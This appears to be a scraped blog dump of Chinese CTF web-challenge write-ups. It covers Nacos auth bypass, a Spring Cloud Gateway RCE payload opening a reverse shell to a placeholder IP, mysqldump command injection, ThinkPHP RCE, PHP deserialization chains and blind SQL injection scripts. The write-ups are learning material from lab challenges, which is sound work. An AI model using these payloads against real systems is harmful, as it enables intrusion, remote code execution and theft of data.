[a-f0-9]{32}去搜索MD5格式的字符串，找到两串很相似的md5字符串猜测一个是key一个是secret_key，把这两个都拿去验证一下，看那个可以解session，哪个就是secret_key，那另一个就是key 先在Linux下输入： 123python3import timetime.time_ns 爆破时间戳伪造session输出几个时间戳看一下，发现前面几个字符都是一样的之后用hashcat工具爆破时间戳 1hashcat -m 0 -a 3 &quot;key值&quot; &quot;168534084?d?d?d?d?d?d?d?d?d?d&quot; 爆破出时间戳之后，结合secret_key一起伪造session 1python3 flasksession.py encode -s &quot;secret_key&quot; -t &quot;&#123;&#x27;key&#x27;:&#x27;时间戳&#x27;&#125;&quot; 得到伪造后的session后，抓包修改，然后访问 &#x2F;flag 即可得到flagflag{8382843b-d3e8-72fc-6625-ba5269953b23} DebugSer（无，Java还没学）dumpit这道题没有找到环境，就跟着网上大佬的wp来过一遍吧打开题目：查看日志，日志内容如下，（其实这不是什么日记，是备份的数据库）搜索了一下，发现是mysqldump导出文件的格式，根据题目提示，应该是命令注入 mysqldump命令注入发现–result-file,-r可以控制文件的输出位置，而且这里的两个参数可控，所以直接命令执行 12?db=&#x27;&lt;?php phpinfo()?&gt;&#x27;&amp;table_2_dump=flag1 --result-file=log/1.php//然后访问：http://xxx/log/1.php 查看phpinfo，搜索flag 还可以用下面的payload 12?db=ctf&amp;table_2_dump=\\%3C\\?\\=phpinfo\\(\\)?\\%3E%202%3E%20log/1.php//利用转义符号将&lt;?=phpinfo()?&gt;写入log/1.php中，然后进行访问http://xxx/log/1.php 这里有个非预期，出题人没有把环境变量删掉，我们可以直接读取环境变量来读flag （非预期）%0A截断绕过读取环境变量12?db=ctf&amp;table_2_dump=%0Aenv//使用%0A做截断，相当于换行执行之后的命令。这里就相当于是env读取环境变量 BackendService好的，这道题也没有找到环境…首先是CVE-2021-29441 CVE-2021-29441身份验证绕过打开环境是一个nacos页面（没看到题目，但是盲猜应该是下面这样，（图取自网络），就应该是个登录框）参考这篇文章可知我们只需要在header添加了user-agent：Nacos-Server时，就会绕过身份验证直接登录nacos账户 1234//post传参username=admin&amp;password=admin//并且把UA头改成下面这样user-agent：Nacos-Server 这样就成功的新建了一个用户名和密码都为admin的用户了登录然后进入后台 Nacos结合Spring Cloud Gateway RCE利用先看篇参考文章了解一下，题目复现wp主要来自https://pysnow.cn/archives/713/进入后台查看源码（详细代码可见上面提到的那篇wp），可知： backendserver为provider服务，监听在8811端口上。（application.yaml）内部配置服务有个8888的gateway服务，id为backcfg。可以直接访问这个内部服务。并且这个服务接受json格式 （bootstrap.yml）这里可以通过修改gateway配置文件反代backendservice服务去nacos后台添加配置然后反弹shell即可：服务器开启监听： 1nc -lvp 6666 然后poc如下：(poc来源) 12345678910111213141516171819202122232425262728&#123; &quot;spring&quot;: &#123; &quot;cloud&quot;: &#123; &quot;gateway&quot;: &#123; &quot;routes&quot;: [ &#123; &quot;id&quot;: &quot;exam&quot;, &quot;order&quot;: 0, &quot;uri&quot;: &quot;lb://backendservice&quot;, &quot;predicates&quot;: [ &quot;Path=/echo/**&quot; ], &quot;filters&quot;: [ &#123; &quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: &#123; &quot;name&quot;: &quot;result&quot;, &quot;value&quot;: &quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash -i &gt;&amp; /dev/tcp/x.xx.xx.xx/6666 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\\r&#x27;,&#x27;&#x27;)&#125;&quot; &#125; &#125; ] &#125; ] &#125; &#125; &#125;&#125; 注意添加配置时的：Data ID要写backcfg，Group为DEFAULT_GROUP然后再：cat &#x2F;flag 即可得到flag(后面发现ctfshow有环境了，那来简单的复现一下吧)","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录⑤--web","slug":"nss⑤","date":"2024-01-08T06:27:45.591Z","updated":"2024-01-08T06:45:37.449Z","comments":true,"path":"2024/01/08/nss⑤/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A4/","excerpt":"比较基础的一些web题⑤","text":"比较基础的一些web题⑤ [羊城杯 2020]easycon访问Index.php这道题一打开是这样的一个页面，感觉这题更偏向misc一般的php主页面都是index.html我们这里可以试着访问一下index.php然后发现是一个一句话木马，然后直接传参执行命令即可POST传参 1cmd=system(&quot;cat bbbbbbbbb.txt &quot;); 然后得到一堆base64编码的东西，拿去解码发现jpg的头，所以尝试下用Base64转图片的在线网站试试 Base64解码转图片NSSCTF&#123;do_u_kn0w_c@idao&#125; [UUCTF 2022 新生赛]ez_rce打开是源码 1234567891011121314151617181920居然都不输入参数，可恶!!!!!!!!!&lt;?php## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if (!preg_match(&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;,$code))&#123; echo &#x27;看看你输入的参数！！！不叫样子！！&#x27;;echo &#x27;&lt;br&gt;&#x27;; eval($code); &#125; else&#123; die(&quot;你想干什么？？？？？？？？？&quot;); &#125;&#125;else&#123; echo &quot;居然都不输入参数，可恶!!!!!!!!!&quot;; show_source(__FILE__);&#125; 看到过滤了很多执行命令的函数，这里我们可以用 反引号 执行命令然后用print回显出来进行绕过那些过滤了的命令可以加反斜杠进行绕过 关键词反斜杠绕过+反引号执行命令+Print回显+空格用+绕过12345?code=printf(`l\\s`);?code=printf(`l\\s+/`);?code=printf(`c\\at+/fffffffffflagafag`);#这里的空格也可以用url编码的%20绕过，比如?code=printf(`c\\at+/fffffffffflagafag`); NSSCTF&#123;This_IS_s0_easy_RCE&#125; [NSSRound#1 Basic]basic_check打开啥都没有，来用dirsearch扫一波dirsearch -u http://node4.anna.nssctf.cn:28766/ -e* 嘻嘻，啥都没有，然后用curl扫描一下 curl扫描 他允许PUT方法，而且PUT方法可以用来上传文件 PUT方法上传文件然后抓包上传文件（可以先转换成POST方法，然后再手动改成PUT方法） 12/111.php?sss=ls //111.php?sss=cat /flag NSSCTF&#123;400c595f-164c-4127-bb02-edf0fb5e9c34&#125; [HNCTF 2022 Week1]easy_html打开环境，提示看cookie，cookie中提示文件f14g.php，访问之后是一个登录框 绕过前端限制这里说输入手机号登录，但是前端限制了输入的长度最多为10位，所以我们就修改前端的长度即可，把最大长度修改的比11大就行，然后再输入手机号即可拿到flagNSSCTF&#123;034f24bd-4def-42a2-8c97-a2111ad82b82&#125; [GDOUCTF 2023]受不了一点1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;?phperror_reporting(0);header(&quot;Content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&#x27;gdou&#x27;])&amp;&amp;isset($_POST[&#x27;ctf&#x27;]))&#123; $b=$_POST[&#x27;ctf&#x27;]; $a=$_POST[&#x27;gdou&#x27;]; if($_POST[&#x27;gdou&#x27;]!=$_POST[&#x27;ctf&#x27;] &amp;&amp; md5($a)===md5($b))&#123; if(isset($_COOKIE[&#x27;cookie&#x27;]))&#123; if ($_COOKIE[&#x27;cookie&#x27;]==&#x27;j0k3r&#x27;)&#123; if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; isset($_GET[&#x27;bbb&#x27;]))&#123; $aaa=$_GET[&#x27;aaa&#x27;]; $bbb=$_GET[&#x27;bbb&#x27;]; if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123; $give = &#x27;cancanwordflag&#x27;; $get =&#x27;hacker!&#x27;; if(isset($_GET[&#x27;flag&#x27;]) &amp;&amp; isset($_POST[&#x27;flag&#x27;]))&#123; die($give); &#125; if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; die($get); &#125; foreach ($_POST as $key =&gt; $value) &#123; $$key = $value; &#125; foreach ($_GET as $key =&gt; $value) &#123; $$key = $$value; &#125; echo $flag; &#125;else&#123; echo &quot;洗洗睡吧&quot;; &#125; &#125;else&#123; echo &quot;行不行啊细狗&quot;; &#125; &#125;&#125;else &#123; echo &#x27;菜菜&#x27;;&#125;&#125;else&#123; echo &quot;就这?&quot;;&#125;&#125;else&#123; echo &quot;别来沾边&quot;;&#125;?&gt;别来沾边 数组比较，数字比较123456#get传参?aaa=114514&amp;bbb=114514a&amp;1=flag&amp;flag=1#post传参gdou[]=1&amp;ctf[]=2#cookie传参cookie=j0k3r NSSCTF&#123;2bb0f907-3501-4451-9482-7996ef29a181&#125; [SWPUCTF 2022 新生赛]ez_ez_php(revenge)源码为 123456789101112131415 &lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123; if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; echo &quot;Nice!!!&quot;; include($_GET[&quot;file&quot;]); &#125; else &#123; echo &quot;Hacker!!&quot;; &#125;&#125;else &#123; highlight_file(__FILE__);&#125;//flag.php 伪协议1?file=php://filter/read=covert,vase64-encode/resource=/flag NSSCTF&#123;9c292bd8-0bdd-481b-b810-38907f0b2246&#125; [SWPUCTF 2022 新生赛]奇妙的MD5抓个包看一下看到hint提示 md5中神奇的字符-ffifdyop经过md5加密后：276f722736c95d99e921722cf9ed621c再转换为字符串：&#39;or&#39;6&lt;乱码&gt; 即 &#39;or&#39;66�]��!r,��b用途：select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;，or后面的第一个字母只要不是0，都会被认为是true，从而实现sql注入的绕过就相当于select * from admin where password=&#39;&#39;or 1 实现sql注入所以第一关输入ffifdyopF12找到线索，md5的弱比较get传参 1x=s878926199a&amp;y=s155964671a 最后一关 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123; echo $FLAG;&#125; md5强比较post传参 1wqh[]=1&amp;dsy[]=2 NSSCTF&#123;94ead189-4555-42ea-bb83-0580a4b4fa68&#125; [HNCTF 2022 Week1]easy_upload直接一句话木马NSSCTF&#123;1a845aba-d706-4c2c-901f-dbb11bb94e12&#125; [鹤城杯 2021]Middle magic12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phphighlight_file(__FILE__);include &quot;./flag.php&quot;;include &quot;./result.php&quot;;if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123; $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]); if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123; echo &quot;here is level 2&quot;; if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123; if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;]) echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;; // START FORM PROCESSING else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123; echo &quot;here is level 3,do you kown how to overcome it?&quot;; if (isset($_POST[&#x27;level_3&#x27;])) &#123; $level_3 = json_decode($_POST[&#x27;level_3&#x27;]); if ($level_3-&gt;result == $result) &#123; echo &quot;success:&quot;.$flag; &#125; else &#123; echo &quot;you never beat me!&quot;; &#125; &#125; else&#123; echo &quot;out&quot;; &#125; &#125; else&#123; die(&quot;no&quot;); &#125; // perform validations on the form data &#125; else&#123; echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;nonono!&#x27;; &#125; echo &#x27;&lt;hr&gt;&#x27;;&#125;?&gt; 首先正则，第一关必须为pass_the_level_1#但是又绕过了Pass，正则表示匹配pass两边的字符并且进行替换 换行符绕过正则直接换行绕过。.点号不会匹配换行符%0a%0apass_the_level_1%23第二个是sha1强相等绕过 sha1强相等绕过–数组绕过admin[]=1&amp;root_pwd[]=2 第三关随便传入就行level_3=&#123;“result”:0&#125;NSSCTF&#123;41e5162c-2a22-48d7-8109-e20e2352a3da&#125; [HNCTF 2022 Week1]What is Web直接f12NSSCTF&#123;Hell0_Weber_Wec0m3_come_2_web_w0r1d!&#125; [SWPUCTF 2022 新生赛]ez_rcethinkphp历史漏洞扫一下目录看一下robots.txt然后访问一下/NSS/index.php/应该是考历史漏洞，thinkphpv5.0.22https://xz.aliyun.com/t/9361浅浅复现一下吧?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /nss/ctf/flag/flag得到flag NSSCTF&#123;c3da9ab0-00c3-4a2c-baf0-34f5b986aaae&#125;","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录④--web","slug":"nss④","date":"2024-01-08T06:27:34.064Z","updated":"2024-01-16T13:43:43.864Z","comments":true,"path":"2024/01/08/nss④/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A3/","excerpt":"比较基础的一些web题④","text":"比较基础的一些web题④ [CISCN 2019华北Day2]Web1 Hack World打开页面是一个查询界面，提示找到flag表和flag列测试一下 1231 //正常回显：Hello, glzjin wants a girlfriend.1&#x27; //显示：bool(false)，则判断类型为布尔盲注1&#x27; and 1=1# //显示SQL Injection Checked,应该是过滤了什么东西，经过测试是过滤了and和空格 布尔盲注先来了解些布尔盲注相关的常用的函数 12345678910111213（1）length：返回值为字符串的字节长度（2）ascii：把字符转换成ascii码值的函数（3）substr(str, pos, len)：在str中从pos开始的位置（起始位置为1），截取len个字符例如：substr（abcd，1，1） 从第一位开始（也就是从a开始）截取一个字符，就是a substr（abcd，2，1） 从第二位开始，截取一个字符，就是b substr（abcd，2，3） 从第二位开始，截取三个字符，就是bcd（4）count：统计表中记录的一个函数，返回匹配条件的行数（5）limit：limit m ：检索前m行数据，显示1-10行数据（m&gt;0） 异或绕过这里我们可以使用异或来代替or输入 12345670^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)//正常回显]/* 大概在这里应用就是假^假 =真 ，真^真=假，假^真=真，真^假=真 当我们查询 1^0、0^1、和 1 的回显是一样的，而查询 1^1 或0^0却会有报错提示。所以结合 sql语句 ，我们可以构造0^payload，若为payload结果真，则返回1，0^1=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。*/ 然后我们再用下面的脚本去爆破即可 1234567891011121314151617181920212223242526import requests import time url = &quot;http://node2.anna.nssctf.cn:28491/index.php&quot; payload = &#123; &quot;id&quot; : &quot;&quot; &#125; result = &quot;&quot; for i in range(1,100): l = 33 r =130 mid = (l+r)&gt;&gt;1 while(l&lt;r): payload[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,mid) html = requests.post(url,data=payload) print(payload) if &quot;Hello&quot; in html.text: l = mid+1 else: r = mid mid = (l+r)&gt;&gt;1 if(chr(mid)==&quot; &quot;): break result = result + chr(mid) print(result) print(&quot;flag: &quot; ,result) 还有一个if方法的脚本也可以用来爆破（这个我试了感觉更快） 123456789101112131415161718192021222324252627import stringimport requestsres=&quot;&quot;url=&quot;http://node2.anna.nssctf.cn:28998/index.php&quot;for i in range(1,60): for j in string.printable: sql=&#x27;if(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))=&#123;1&#125;,1,2)&#x27;.format(i,ord(j)) post=&#123;&quot;id&quot;:sql&#125; result=requests.post(url=url,data=post) if &#x27;Hello&#x27; in result.text: res+=j print(res) else: continue NSSCTF{2365c1ca-eebc-4940-ad05-a397b1ca75a7} [NSSCTF 2022 Spring Recruit]babyphp123456789101112131415161718192021 &lt;?phphighlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123; if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123; if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123; if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123; echo $flag; &#125;else&#123; echo &quot;yee&quot;; &#125; &#125;else&#123; echo &quot;nop&quot;; &#125; &#125;else&#123; echo &quot;go on&quot;; &#125;&#125;else&#123; echo &quot;let&#x27;s get some php&quot;;&#125;?&gt; let&#x27;s get some php intval()函数 — 获取变量的整数值is_string() 函数用于检测变量是否是字符串 正则无数字绕过这里要求我们传5个参数，参数a的正则绕过可以用数组，preg_match只能处理字符串，当传入的参数是数组时会返回false，md5强比较也可以用数组绕过。 md5强比较和弱比较c1和c2要求必须是字符串类型，而且还有个md5的弱比较，则用md5加密之后为0e开头识别为科学计数法结果均为0绕过 12#payload：a[]=0&amp;b1[]=1&amp;b2[]=2&amp;c1=QNKCDZO&amp;c2=s878926199a [GDOUCTF 2023]EZ WEB首先点开没有什么信息，用dirsearch来扫描一波发现目录/src app.py内容如下 put传参12345678910111213141516 import flask app = flask.Flask(__name__) @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;]) def index(): return flask.send_file(&#x27;index.html&#x27;) @app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;]) def source(): return flask.send_file(&#x27;app.py&#x27;) @app.route(&#x27;/super-secret-route-nobody-will-guess&#x27;, methods=[&#x27;PUT&#x27;]) def flag(): return open(&#x27;flag&#x27;).read() 这里主要考个put传参，抓包改一下就可以了 [GKCTF 2020]cve版签到 打开界面，点击链接，显示的是index.html文件上传之后的http响应头 抓包看到了提示 ssrf+%00截断 flag在本地而且必须要以123结尾 跳转之后的url框显示 1http://node4.anna.nssctf.cn:28342/?url=http://www.ctfhub.com这里去搜索这个cve漏洞 cve-2020-7066漏洞：PHP 7.2.29之前的7.2.x版本、 7.3.16之前的7.3.x版本、 7.4.4之前的7.4.x版本中的 ‘get_headers()’函数存在安全漏洞。可以⽤来绕WAF，SSRF利⽤。 get_headers() 返回⼀个数组，包含有服务器响应⼀个 HTTP 请求所发送的标头。 这个函数会截断00后的内容，所以读取到的url为http://localhost 这里用00截断去绕过 00截断 00截断包括%00截断和0x00截断 0x00是⼗六进制表示⽅法，是在ascii码中为0的字符，有些函数会将0x00当做结束符，从⽽进⾏⽂件上传的绕过 在url⾥⾯，get传⼊的%00会经过⼀次解码，解码为0x00,发挥截断作⽤。 所以最后的payload为 1?url=http://127.0.0.123%00www.ctfhub.com [HNCTF 2022 Week1]2048前端js命令执行在F12里，找到游戏结束之前的那一串alert，然后放到控制台执行一下 1alert(String.fromCharCode(24685,21916,33,102,108,97,103,123,53,51,49,54,48,99,56,56,56,101,50,53,99,51,102,56,50,56,98,50,51,101,51,49,54,97,55,97,101,48,56,51,125)); 即可得到flag [NISACTF 2022]popchains反序列化+php伪协议123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Happy New Year~ MAKE A WISH &lt;?php echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;; if(isset($_GET[&#x27;wish&#x27;]))&#123; @unserialize($_GET[&#x27;wish&#x27;]); &#125; else&#123; $a=new Road_is_Long; highlight_file(__FILE__); &#125; /***************************pop your 2022*****************************/ class Road_is_Long&#123; public $page; public $string; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;page = $file; &#125; public function __toString()&#123; return $this-&gt;string-&gt;page; &#125; public function __wakeup()&#123; if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\\.\\./i&quot;, $this-&gt;page)) &#123; echo &quot;You can Not Enter 2022&quot;; $this-&gt;page = &quot;index.php&quot;; &#125; &#125; &#125; class Try_Work_Hard&#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125; &#125; class Make_a_Change&#123; public $effort; public function __construct()&#123; $this-&gt;effort = array(); &#125; public function __get($key)&#123; $function = $this-&gt;effort; return $function(); &#125; &#125; /**********************Try to See flag.php*****************************/ 遇到反序列化的题，首先进行一下代码审计，利用的点应该是Try_Wirk_Hard类里的include()文件包含，之后就到了invoke()魔术方法，__invoke()当脚本尝试将对象调用为函数时触发之后我们看到Make_a_Change的类中的__get()方法，__get 魔术方法 是当访问一个类中的属性不存在或者private 的时候会被调用在 Road_is_Long类中，如下代码就会访问其page 属性，而其类中没有此方法，则会调用__get() 123public function __toString()&#123; return $this-&gt;string-&gt;page;&#125; __toString()，类被当成字符串时触发，那我们看到__wakeup()，如果$page 是一个对象，那么进入正则 $this-&gt;page 当做了字符串去匹配了。也就触发了 __toString 所以有下面的exp 12345678910111213141516171819202122 &lt;?php class Road_is_Long&#123; public $page; public $string; &#125; class Try_Work_Hard&#123; protected $var = &#x27;file:///flag&#x27;; //给var赋值，然后__invoke调用append，再赋值给value执行&#125; &#125; class Make_a_Change&#123; public $effort; &#125; $qw = new Road_is_Long(); //return一个对象，就相当于把page当作字符串，所以调用了__toString()$qw -&gt; page = $qw;//string来new了get所在的类，return $this-&gt;string-&gt;page，但是get所在的类里没有page属性，所以调用了get$qw -&gt; string = new Make_a_Change;//把effort用来new了一个对象，并且把对象return为函数形式，所以带你用了invoke，触发了include$qw -&gt; string -&gt; effort = new Try_Work_Hard;$wy = urlencode(serialize($qw));echo($wy); 1?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Br%3A1%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A12%3A%22file%3A%2F%2F%2Fflag%22%3B%7D%7D%7D [HCTF 2018]Warmup访问source.php查看源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 第一段代码提示我们白名单有source.php和hint.php，所以我们也访问一下hint.php看看 1flag not here, and flag in ffffllllaaaagggg 提示了flag的文件名 正则绕过代码先判定了传⼊的是不是空或者是不是字符串，然后进⾏了三次⽩名单判断。in_array()函数如果search参数是字符串且type参数被设置为 TRUE，则搜索区分⼤⼩写。type 如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 falsemb_substr()函数 mb_strpos()函数mb_strpos()：返回要查找的字符串在别⼀个字符串中⾸次出现的位置。所以这里要求我们传入的参数file，要含有白名单里的字符串所以有 目录穿越123?file=hint.php?../../../../../../../../../../../ffffllllaaaagggg//或者?file=source.php?../../../../../../../../../../../ffffllllaaaagggg [HNCTF 2022 Week1]Interesting_include12345678910111213&lt;?php//WEB手要懂得搜索//flag in ./flag.phpif(isset($_GET[&#x27;filter&#x27;]))&#123; $file = $_GET[&#x27;filter&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 这里匹配flag文件，如果没有匹配到flag，则会退出输出error filter伪协议 php://filter伪协议可以用于如下函数：include()file()file_get_contents()readfile()file_put_contents()可以用于读取、写入文件等函数， payload为： 1/?filter=php://filter/read=convert.base64-encode/resource=flag.php [SWPUCTF 2022 新生赛]ez_rce照常，扫一下扫出来蛮多路径的，访问一下/robots.txt然后得到路径/NSS/index.php/然后发现是thinkphp5这个版本，然后去网上搜下这个版本的rce漏洞搜到这篇文章","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录③--web","slug":"nss③","date":"2024-01-08T06:27:13.708Z","updated":"2024-01-08T06:33:45.161Z","comments":true,"path":"2024/01/08/nss③/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A2/","excerpt":"比较基础的一些web题③","text":"比较基础的一些web题③ [强网杯 2019]随便注为SQL注入，测试如下 堆叠注入堆叠注入大概的意思就是用;连接起两个语句，然后让他们一起执行 1234567891011121 //正常回显1&#x27; //报错1&#x27; or 1=1 //报错1&#x27; or 1=1# //正常回显，则为字符型单引号注入，接下来判断字段数1&#x27; order by 2# //正常回显1&#x27; order by 3# //报错，字段数为21&#x27; union select 1,2# //判断回显位，然后回显了过滤的东西//return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); //查看数据库1&#x27;;show tables;# //查表1&#x27;; show columns from `1919810931114514`; # //查看字段信息！！注意在那个表的两边要打反引号//!!!!!!!!!!使用show 命令查看表中的「字段」，注意表名要用反引号包裹,尤其当表名为数字的时候 上面我们已经知道flag的文件了，但是过了滤了很多东西，我们要怎么获取这个flag呢接下来就有几种方法了，方法来自参考文章 alter语句alter修改表名 alter table 表名 rename 新表名;修改字段名 alter table 表名 change 旧字段名 新字段名 类型;通过题目观察 表单有两列, 也就是1 和 hahahah我们可以推测 这个表单其实是从表中以id字段为索引获取到内容 然后返回到前台并且后台的查询语句为”select * from words where id=&#39;.$_GET[&#39;inject&#39;].&#39;“ 那么 我们就可以通过修改带flag字段的表的名字为words表 然后把flag 字段修改为id通过三条alter语句来修改 修改words表名为table alter table words rename table; 修改1919810931114514表名为words &#96;alter table 1919810931114514 rename words; 修改新的words表中的flag列名为id alter table words change flag id ;得到最终payload 1&#39;; alter table words rename to words1;alter table 1919810931114514 rename to words;alter table words change flag id varchar(50);# 提交之后再输入1，发现没有结果了，那是因为原来的存放有id字段的words表已经变了我们可以通过让条件永真(输入万能密码），然后查出所有数据，进而获得flag1&#39; or 1=1# 预编译方式拼接关键字预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤 格式： 123PREPARE 名称 FROM Sql语句 ? ;SET @x=xx;EXECUTE 名称 USING @x; 举例：查询ID为1的用户： 12345678910111213141516171819202122232425262728293031323334353637方法一：SElECT * FROM t_user WHERE USER_ID = 1方法二：PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;EXECUTE jia;方法三：PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;SET @ID = 1;EXECUTE jia USING @ID;方法四：SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;PREPARE jia FROM @SQL;EXECUTE jia;````因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：``1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#``##### 十六进制编码我们可以直接将`` select * from `1919810931114514` ``语句进行16进制编码，即：`73656c656374202a2066726f6d20603139313938313039333131313435313460`，替换payload：`1&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#`同时，我们也可以先定义一个变量并将sql语句初始化，然后调用`1&#x27;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#`##### handler方法- handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：```text打开表：HANDLER 表名 OPEN ;查看数据：HANDLER 表名 READ next;关闭表：HANDLER 表名 READ CLOSE; 1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` 